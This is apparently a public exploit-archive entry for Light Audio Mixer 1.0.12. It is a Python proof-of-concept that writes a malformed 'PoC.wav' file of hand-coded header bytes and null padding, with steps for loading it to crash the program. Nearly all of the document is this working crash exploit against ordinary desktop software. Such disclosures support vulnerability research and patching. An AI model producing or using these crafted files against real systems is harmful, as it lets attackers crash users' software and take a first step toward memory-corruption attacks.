# Exploit Title: Light Audio Mixer Version 1.0.12 (.wav) - Crash POC
# Date: 14-07-2013
# Exploit Author: ariarat
# Software Link: http://download.cnet.com/Light-Audio-Mixer/3000-2139_4-10791607.html
# Version: 1.0.12
# Tested on: [ Windows XP sp3]
#============================================================================================
# After creating PoC file.(.wav),drag it to Play List and choose a Deck(if present) and press OK!
#============================================================================================
# Contact :
#------------------
# Web Page : http://ariarat.blogspot.com
# Email    : mehdi.esmaeelpour@gmail.com
#============================================================================================

#!/usr/bin/python

string=("\x2E\x73\x6E\x64\x00\x00\x01\x18\x00\x00\x42\xDC\x00\x00\x00\x01"
"\x00\x00\x1F\x40\x00\x00\x00\x00\x69\x61\x70\x65\x74\x75\x73\x2E"
"\x61\x75\x00\x20\x22\x69\x61\x70\x65\x74\x75\x73\x2E\x61\x75\x22"
"\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")

filename = "PoC.wav"
file = open(filename , "w")
file.write(string)
file.close()